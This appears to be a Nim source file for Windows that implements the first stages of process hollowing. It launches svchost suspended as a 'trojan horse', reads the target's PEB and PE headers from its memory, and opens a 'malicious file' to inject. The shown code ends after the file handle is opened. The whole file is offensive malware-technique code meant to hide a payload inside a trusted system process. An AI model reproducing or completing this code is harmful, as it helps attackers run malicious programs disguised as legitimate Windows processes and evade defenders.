import winim/inc/windef
import winim/inc/winbase
import winim/inc/imagehlp
import winim/lean
import strutils

type
    PEB64* {.pure.} = object
        InheritedAddressSpace*: BOOLEAN
        ReadImageFileExecOptions*: BOOLEAN
        BeingDebugged*: BOOLEAN
        Spare*: BOOLEAN
        Mutant*: HANDLE
        ImageBaseAddress*: PVOID
        LoaderData*: PPEB_LDR_DATA
        ProcessParameters*: PRTL_USER_PROCESS_PARAMETERS
        SubSystemData*: PVOID
        ProcessHeap*: PVOID
        FastPebLock*: PVOID
        FastPebLockRoutine*: PVOID
        FastPebUnlockRoutine*: PVOID
        EnvironmentUpdateCount*: ULONG
        KernelCallbackTable*: PVOID
        EventLogSection*: PVOID
        EventLog*: PVOID
        FreeList*: PVOID
        TlsExpansionCounter*: ULONG
        TlsBitmap*: PVOID
        TlsBitmapBits*: array[2, ULONG]
        ReadOnlySharedMemoryBase*: PVOID
        ReadOnlySharedMemoryHeap*: PVOID
        ReadOnlyStaticServerData*: ref PVOID
        AnsiCodePageData*: PVOID
        OemCodePageData*: PVOID
        UnicodeCaseTableData*: PVOID
        NumberOfProcessors*: ULONG
        NtGlobalFlag*: ULONG
        Spare2*: array[4, BYTE]
        CriticalSectionTimeout*: LARGE_INTEGER
        HeapSegmentReserve*: ULONG
        HeapSegmentCommit*: ULONG
        HeapDeCommitTotalFreeThreshold*: ULONG
        HeapDeCommitFreeBlockThreshold*: ULONG
        NumberOfHeaps*: ULONG
        MaximumNumberOfHeaps*: ULONG
        ProcessHeaps*: ref PVOID
        GdiSharedHandleTable*: PVOID
        ProcessStarterHelper*: PVOID
        GdiDCAttributeList*: PVOID
        LoaderLock*: PVOID
        OSMajorVersion*: ULONG
        OSMinorVersion*: ULONG
        OSBuildNumber*: ULONG
        OSPlatformId*: ULONG
        ImageSubSystem*: ULONG
        ImageSubSystemMajorVersion*: ULONG
        ImageSubSystemMinorVersion*: ULONG
        GdiHandleBuffer*: array[34, ULONG]
        PostProcessInitRoutine*: ULONG
        TlsExpansionBitmap*: ULONG
        TlsExpansionBitmapBits*: array[32, ULONG]
        SessionId*: ULONG

var
    bufsize = int32(MAX_PATH)
    sourceFileName: wstring = newWString(bufsize)
    maliciousFileName: wstring
    x: int
    pi: PROCESS_INFORMATION
    si: STARTUPINFOW
    pbi: PROCESS_BASIC_INFORMATION
    dwReturnLength: DWORD
    peb: PEB64
    pImageDosHeader: PIMAGE_DOS_HEADER
    pLoadedImage : ref LOADED_IMAGE

when isMainModule:
    # Get the path of the current executable (compiled by nim)
    x = GetModuleFileNameW(0, &sourceFileName, bufsize)
    
    if x == 0:
        echo "[!] GetModuleFileNameW failed. Error: ", GetLastError()
    else:
        echo "[+] PATH of the executable:\n\t", sourceFileName

    # Get the path of the binary "helloworld.exe" stored in the same directory
    # as the current one
    var t = `-$` sourceFileName
    var y = rfind(t.string, r"\")    
    maliciousFileName = `+$` t[0..y].string & "helloworld.exe"
    
    echo "[+] PATH of the malicious file:\n\t", maliciousFileName

    # create suspended process from svchost.exe
    # basicallly the "trojan horse"
    x = CreateProcessW(NULL,`+$` "svchost", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    if x == 0:
        echo "[!] CreateProcessW failed. Error: ", GetLastError()

    # get the base address of the PEB
    x = NtQueryInformationProcess(pi.hProcess, 0, &pbi, (ULONG) sizeof(pbi), &dwReturnLength)
    if x != 0:
        echo "[!] NtQueryInformationProcess failed. NTSTATUS value: ", x

    echo "[+] PEB Base Address: ", toHex(cast[LONGLONG](pbi.PebBaseAddress))

    x = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, (SIZE_T) sizeof(PEB64), NULL)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError()

    var buffer : array[0x2000, byte]
    var lpNumberOfBytesRead: SIZE_T

    echo "[+] Image base address: ", toHex(cast[LONGLONG](peb.ImageBaseAddress))   

    x = ReadProcessMemory(pi.hProcess, peb.ImageBaseAddress, &buffer, 0x2000, &lpNumberOfBytesRead)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError(), "\n\t"
    else:
        echo "[+] ReadProcessMemory succeeded. Bytes copied: ", lpNumberOfBytesRead

    pLoadedImage = new(LOADED_IMAGE)

    var pDOSHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](&buffer);
    echo "[+] Address of the DOS Header: ", toHex(cast[LONGLONG](pDOSHeader))

    echo "[+] DOS Header structure:\n\tMagic number: ", toHex(pDOSHeader.e_magic),
        "\n\tSize of last page: ", pDOSHeader.e_cblp,
        "\n\tNumber of pages: ", pDOSHeader.e_cp,
        "\n\tRelocations: ", pDOSHeader.e_crlc,
        "\n\tSize of header in paragraphs: ", pDOSHeader.e_cparhdr,
        "\n\tMinimum extra paragraphs needed: ", pDOSHeader.e_minalloc,
        "\n\tMaximum extra paragraphs needed: ", pDOSHeader.e_maxalloc,
        "\n\tInitial (relative) SS value: ", pDOSHeader.e_ss,
        "\n\tInitial SP value: ", pDOSHeader.e_sp,
        "\n\tChecksum: ", pDOSHeader.e_csum,
        "\n\tInitial IP value: ", pDOSHeader.e_ip,
        "\n\tInitial (relative) CS value: ", pDOSHeader.e_cs,
        "\n\tFile address of relocation table: ", pDOSHeader.e_lfarlc,
        "\n\tOverlay number: ", pDOSHeader.e_ovno,
        "\n\tReserved words: ", pDOSHeader.e_res,
        "\n\tOEM identifier (for e_oeminfo): ", pDOSHeader.e_oemid,
        "\n\tOEM information; e_oemid specific: ", pDOSHeader.e_oeminfo,
        "\n\tReserved words: ", pDOSHeader.e_res2,
        "\n\tFile address of new exe header: ", pDOSHeader.e_lfanew
    
    var z = cast[LONGLONG](pDOSHeader) + pDOSHeader.e_lfanew
    echo "[+] PE File Header address: ", toHex(z)

    var fileHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[LONGLONG](&buffer) + pDOSHeader.e_lfanew)
    pLoadedImage.FileHeader = fileHeader
    
    echo "[+] PE File Header structure:\n\tMachine: ", toHex(fileHeader.FileHeader.Machine),
        "\n\tNumber of sections: ",  fileHeader.FileHeader.NumberOfSections,
        "\n\tTimestamp: ",  toHex(fileHeader.FileHeader.TimeDateStamp),
        "\n\tPointer to symbol table: ",  fileHeader.FileHeader.PointerToSymbolTable,
        "\n\tNumber of symbols: ",  fileHeader.FileHeader.NumberOfSymbols,
        "\n\tSize of optional header: ",  fileHeader.FileHeader.SizeOfOptionalHeader,
        "\n\tCharacteristics: ",  fileHeader.FileHeader.Characteristics

    pLoadedImage.NumberOfSections = cast[ULONG](pLoadedImage.FileHeader.FileHeader.NumberOfSections)
    pLoadedImage.Sections = cast[PIMAGE_SECTION_HEADER](cast[LONGLONG](&buffer) + pDOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64))

    var hFile : HANDLE = CreateFileW(maliciousFileName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, 0)
    if hFile == INVALID_HANDLE_VALUE:
        echo "[!] CreateFileW failed. Error: ", GetLastError()
    else:
        echo "[+] Got a handle on the malicious file: ", maliciousFileName